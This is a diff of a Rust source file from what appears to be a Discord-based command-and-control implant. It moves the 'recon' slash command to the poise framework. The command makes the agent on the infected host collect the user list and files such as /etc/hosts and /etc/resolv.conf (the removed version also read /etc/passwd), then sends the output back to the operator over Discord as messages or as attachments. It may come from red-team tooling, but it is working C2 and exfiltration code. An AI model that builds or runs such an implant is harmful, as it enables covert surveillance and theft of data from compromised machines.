@@ -1,134 +1,112 @@
 use std::borrow::Cow;
 
 use chrono::Utc;
-use serenity::{
-	builder::{CreateApplicationCommand, CreateApplicationCommandOption},
-	client::Context,
-	model::{
-		application::{
-			command::CommandOptionType,
-			interaction::application_command::{ApplicationCommandInteraction, CommandDataOption, CommandDataOptionValue},
-		},
-		prelude::AttachmentType,
-	},
-};
-use tracing::{error, info as informational};
+use poise::serenity_prelude::AttachmentType;
+use tracing::info as informational;
 
 use crate::{
-	discord_utils::bot_functions::{send_follow_up_response, send_interaction_response, split_string},
-	errors::DiscordC2Error,
+	discord_utils::bot_functions::split_string,
 	os::recon_utils::{run_recon, ReconType},
+	Context,
+	Error,
 };
 
-pub fn create_recon_option(option: &mut CreateApplicationCommandOption) -> &mut CreateApplicationCommandOption {
-	let option = option
-		.name("recon_type")
-		.kind(CommandOptionType::String)
-		.description("Type of recon command to perform")
-		.required(true);
+#[derive(Debug, poise::ChoiceParameter)]
+pub enum ReconChoices {
+	/*  Platform Agnostic */
+	#[name = "Get user list"]
+	Userlist,
 
-	// Potentially expand this to a sub command in the future?
-	option.add_string_choice("Get user list", "userlist");
+	/* Platform Specific - Linux */
+	#[cfg(target_os = "linux")]
+	#[name = "Get /etc/resolv.conf"]
+	EtcResolv,
 
 	#[cfg(target_os = "linux")]
-	option
-		.add_string_choice("Get /etc/passwd", "/etc/passwd")
-		.add_string_choice("Get /etc/resolv.conf", "/etc/resolv.conf")
-		.add_string_choice("Get /etc/hosts", "/etc/hosts");
-
-	//#[cfg(target_os = "windows")]
-	// nothing here yet
-
-	option
+	#[name = "Get /etc/hosts"]
+	EtcHosts,
+	/* Platform Specific - Windows */
 }
 
-pub fn register(command: &mut CreateApplicationCommand) -> &mut CreateApplicationCommand {
-	command
-		.name("recon")
-		.description("Performs various recon operations/commands with the agent.")
-		.create_option(|option| {
-			create_recon_option(option) // Call the recon function from here, passing in the mutable reference to our option.
-		});
-	command
-}
+impl ReconChoices {
+	fn as_str(&self) -> &str {
+		match self {
+			/*  Platform Agnostic */
+			ReconChoices::Userlist => "userlist",
 
-pub async fn run(options: &[CommandDataOption]) -> Result<String, DiscordC2Error> {
-	let options = options.to_owned();
-
-	let operation = options
-		.get(0)
-		.ok_or(DiscordC2Error::InternalError("Expected recon operation at index 0".to_string()))?
-		.resolved
-		.as_ref()
-		.ok_or(DiscordC2Error::InternalError("Expected valid recon operation".to_string()))?;
-
-	if let CommandDataOptionValue::String(operation) = operation {
-		match operation.as_str() {
-			"userlist" => Ok(run_recon("userlist", ReconType::Agnostic)),
-			#[cfg(target_os = "windows")]
-			_ => Ok(run_recon(operation.as_str(), ReconType::Windows)),
+			/* Platform Specific - Linux */
 			#[cfg(target_os = "linux")]
-			_ => Ok(run_recon(operation.as_str(), ReconType::Linux)),
+			ReconChoices::EtcResolv => "/etc/resolv.conf",
+			#[cfg(target_os = "linux")]
+			ReconChoices::EtcHosts => "/etc/hosts",
+			/* Platform Specific - Windows */
+		}
+	}
+}
+
+// Windows specific version of the recon command
+#[cfg(target_os = "windows")]
+/// Performs various recon operations/commands with the agent.
+#[poise::command(slash_command)]
+pub async fn recon(ctx: Context<'_>, #[description = "A supported recon option"] operation: ReconChoices) -> Result<(), Error> {
+	let result = match operation.as_str() {
+		"userlist" => run_recon("userlist", ReconType::Agnostic),
+		_ => run_recon(operation.as_str(), ReconType::Windows),
+	};
+	recon_handler(ctx, result).await?;
+	Ok(())
+}
+
+// Linux specific version of the recon command
+#[cfg(target_os = "linux")]
+/// Performs various recon operations/commands with the agent.
+#[poise::command(slash_command)]
+pub async fn recon(ctx: Context<'_>, #[description = "A supported recon option"] operation: ReconChoices) -> Result<(), Error> {
+	let result = match operation.as_str() {
+		"userlist" => run_recon("userlist", ReconType::Agnostic),
+		_ => run_recon(operation.as_str(), ReconType::Linux),
+	};
+	recon_handler(ctx, result).await?;
+	Ok(())
+}
+
+pub async fn recon_handler(ctx: Context<'_>, operation: String) -> Result<(), Error> {
+	// Less than soft char limit, just drop the string as a response
+	if operation.len() < 2000 {
+		let formatted = format!("```ansi\n{}```", operation);
+		ctx.say(formatted).await?;
+	}
+	// Greater than soft char limit, but less than the hard char limit.
+	else if operation.len() >= 2000 && operation.len() <= 8000 {
+		// Split the strings into a vec, and create an initial response with the first vec.
+		let split_strings = split_string(&operation);
+		let formatted = format!("```ansi\n{}```", split_strings.get(0).unwrap());
+
+		ctx.say(formatted).await?;
+
+		// For remaining vecs, send a follow up response.
+		for string in split_strings.iter().skip(1) {
+			let formatted = format!("```ansi\n{}```", string);
+			let channel_id = ctx.channel_id();
+			channel_id.say(&ctx.serenity_context().http, formatted).await?;
 		}
 	} else {
-		Err(DiscordC2Error::InvalidInput("Invalid recon operation.".to_string()))
+		ctx.defer().await?; // Let's defer here because this might take a while...
+
+		// Send this big ass message as an attachment.
+		let string = operation.clone();
+		let bytes = string.as_bytes();
+
+		informational!("Recieved extremely large message: {:?}", bytes.len());
+
+		// Create an attachment from the bytes
+		let attachment = AttachmentType::Bytes {
+			data:     Cow::from(bytes),
+			filename: format!("{}.txt", Utc::now().to_string()),
+		};
+
+		ctx.send(|reply| reply.content("File was too large, sent attachment instead:").attachment(attachment))
+			.await?;
 	}
-}
-
-pub async fn recon_handler(ctx: &Context, command: &ApplicationCommandInteraction) -> Result<(), DiscordC2Error> {
-	let operation = run(&command.data.options).await;
-
-	match operation {
-		Ok(string) => {
-			// Less than char limit, just drop the string as a response
-			if string.len() < 2000 {
-				let formatted = format!("```ansi\n{}```", string);
-				// Send the succesful response with the output of operation
-				if let Err(why) = send_interaction_response(ctx, command, formatted, None).await {
-					error!("Ran into an error when sending an interaction response: {}", why);
-				}
-			} else if
-			// If the string is greater than the char limit, but can be broken up into ~4 messages, just create follow up responses
-			string.len() >= 2000 && string.len() <= 8000 {
-				informational!("Main string length: {}", string.len());
-
-				// Split the strings into a vec, and create an initial response with the first vec.
-				let split_strings = split_string(&string);
-				let formatted = format!("```ansi\n{}```", split_strings.get(0).unwrap());
-
-				informational!("First vec length: {}", formatted.len());
-
-				let response = send_interaction_response(ctx, command, formatted, None).await?;
-
-				// For remaining vecs, send a follow up response.
-				for string in split_strings.iter().skip(1) {
-					let formatted = format!("```ansi\n{}```", string);
-					informational!("Further vec length: {}", string.len());
-					if let Err(why) = send_follow_up_response(ctx, &response, formatted, None).await {
-						error!("Ran into an error when sending an interaction response: {}", why);
-					}
-				}
-			} else {
-				// Send this big ass message as an attachment.
-				let string = string.clone();
-				let bytes = string.as_bytes();
-
-				// Create an attachment from the bytes
-				let attachment = AttachmentType::Bytes {
-					data:     Cow::from(bytes),
-					filename: format!("{}.txt", Utc::now().to_string()),
-				};
-
-				send_interaction_response(ctx, command, "File was too large, sent attachment instead:", Some(attachment)).await?;
-			}
-		},
-		Err(why) => {
-			// Send a response indicating why this failed.
-			if let Err(why) = send_interaction_response(ctx, command, why.to_string(), None).await {
-				error!("Ran into an error when sending an interaction response: {}", why);
-			}
-		},
-	}
-
 	Ok(())
 }
